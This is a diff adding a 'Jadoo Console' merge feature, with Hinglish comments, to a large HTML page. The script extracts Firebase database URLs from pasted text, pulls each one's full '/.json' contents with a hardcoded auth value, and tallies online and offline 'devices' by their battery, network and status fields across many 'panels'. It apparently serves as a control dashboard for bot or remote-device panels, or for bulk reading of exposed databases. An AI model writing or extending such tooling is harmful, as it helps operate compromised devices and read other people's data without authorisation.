@@ -26178,4 +26178,95 @@ console.log("✅ Discord webhook integration loaded!");
         vertical-align: middle !important;
     }
 </style>
+                                                                       <!-- ========================================== -->
+<!-- JADOO CONSOLE: MERGE / MULTI-DB FEATURE  -->
+<!-- ========================================== -->
+<script>
+// Multiple Firebase URLs ko parse karke ek sath aggregate karne ka function
+async function scanMergedFirebases(dbUrlsInput, authKey = "H") {
+    let urls = [];
+    if (typeof dbUrlsInput === 'string') {
+        // Text ya textarea se saare firebaseio.com / firebasedatabase.app URLs nikalna
+        const regex = /https?:\/\/[a-zA-Z0-9_.-]+\.(?:firebaseio\.com|firebasedatabase\.app)/g;
+        let match;
+        while ((match = regex.exec(dbUrlsInput)) !== null) {
+            let cleanUrl = match[0].replace(/\/$/, "");
+            if (!urls.includes(cleanUrl)) urls.push(cleanUrl);
+        }
+    } else if (Array.isArray(dbUrlsInput)) {
+        urls = dbUrlsInput;
+    }
+
+    if (urls.length === 0) {
+        alert("⚠️ Koi bhi valid Firebase URL nahi mila, Boss!");
+        return;
+    }
+
+    console.log(`⚡ Merging and scanning ${urls.length} databases...`);
+    
+    let totalStats = { totalPanels: urls.length, online: 0, offline: 0, totalDevices: 0 };
+    let panelResults = [];
+
+    // Asynchronous parallel requests with concurrency limit (bina freeze hue)
+    const fetchPromises = urls.map(async (dbUrl) => {
+        let endpoint = `${dbUrl}/.json?auth=${authKey}`;
+        try {
+            let response = await fetch(endpoint, { signal: AbortSignal.timeout(5000) });
+            if (response.status === 200) {
+                let data = await response.json();
+                let counts = parseStatsHelper(data);
+                return { url: dbUrl, success: true, ...counts };
+            }
+        } catch (e) {
+            // Fallback error handling
+        }
+        return { url: dbUrl, success: false, total: 0, online: 0, offline: 0 };
+    });
+
+    let results = await Promise.all(fetchPromises);
+    
+    results.forEach(res => {
+        totalStats.online += res.online;
+        totalStats.offline += res.offline;
+        totalStats.totalDevices += res.total;
+        panelResults.push(res);
+    });
+
+    return { totalStats, panelResults };
+}
+
+// Stats helper parser (jo aapke bot/console ke data ko padhta hai)
+function parseStatsHelper(data) {
+    let online = 0, offline = 0, total = 0;
+    if (!data) return { total, online, offline };
+
+    if (typeof data === 'object') {
+        Object.keys(data).forEach(k => {
+            let v = data[k];
+            if (v && typeof v === 'object') {
+                // Check if node contains device metrics
+                let isDevice = Object.keys(v).some(sub => ['battery', 'network', 'status', 'connection', 'state'].includes(sub));
+                if (isDevice) {
+                    total++;
+                    let statusStr = String(v.status || v.connection || v.state || "").toLowerCase();
+                    let isActive = ['online', 'connected', 'true', '1', 'active', 'green'].includes(statusStr);
+                    if (isActive) online++; else offline++;
+                }
+            }
+        });
+    } else if (Array.isArray(data)) {
+        total = data.length;
+        offline = total;
+    }
+    return { total, online, offline };
+}
+
+// Base64 Merged Payload Generator (Share by Merging Link)
+function generateMergedPayload(urls) {
+    let combined = urls.join("|||");
+    let encoded = btoa(unescape(encodeURIComponent(combined)));
+    return `${window.location.origin}${window.location.pathname}?m=${encoded}`;
+}
+</script>
+
 </body></html>
